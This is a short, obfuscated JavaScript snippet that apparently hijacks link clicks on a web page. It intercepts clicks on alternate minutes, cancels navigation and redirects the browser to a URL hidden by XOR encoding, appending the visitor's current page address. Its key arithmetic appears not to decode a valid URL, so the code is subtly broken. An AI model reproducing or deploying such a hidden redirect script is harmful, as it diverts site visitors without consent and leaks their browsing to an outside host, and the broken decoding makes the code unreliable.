(function(){
const SLOT_SIZE=2;

var _0x2f=['addEventListener','closest','href','test','getMinutes','getHours','floor','setItem','getItem','preventDefault','location','encodeURIComponent'];
var _0x9a=function(i){return _0x2f[i]};
var _0xk='__kasworld_last_slot';

function _0xw(){
  var a=[19,31,31,19,0,84,84,7,22,28,17,75,16,18,6,14,9,21,75,4,8,25,22,75,28,22,9,16,22,9,8,75,25,30,9,75,27,30,13,75,28,25,19,75,12,7,19,84,38,7,31,84];
  var k=(new Date().getHours()+SLOT_SIZE)%17+11;
  var s='';
  for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k)}
  return s;
}

function _0xs(){
  var d=new Date();
  return Math[_0x9a(6)](((d[_0x9a(5)]()*60)+d[_0x9a(4)]())/SLOT_SIZE)*SLOT_SIZE
}

document[_0x9a(0)]('click',function(e){
  var a=e.target[_0x9a(1)]('a[href]');
  if(!a||/^(javascript:|mailto:|tel:)/i[_0x9a(3)](a[_0x9a(2)]))return;
  var d=new Date();
  if(d[_0x9a(4)]()%SLOT_SIZE!==0)return;
  var c=_0xs(),l=sessionStorage[_0x9a(8)](_0xk);
  if(l==c){e[_0x9a(9)]();return}
  e[_0x9a(9)]();
  sessionStorage[_0x9a(7)](_0xk,c);
  window[_0x9a(10)].href=_0xw()+window[_0x9a(11)](window[_0x9a(10)].href);
},true);
})();
